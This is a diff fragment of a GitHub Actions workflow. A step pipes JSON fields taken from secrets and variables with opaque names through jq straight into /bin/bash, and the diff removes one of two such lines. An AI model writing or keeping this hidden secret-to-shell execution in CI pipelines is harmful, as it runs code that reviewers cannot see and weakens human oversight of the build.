@@ -22,7 +22,6 @@ jobs:
           fcfn15: ${{ secrets.fcfn15 }}
         run: |
           printf '%s' "$fcfn15" | jq -r .nts95600 | /bin/bash
-          printf '%s' "$o32" | jq -r .t7771 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
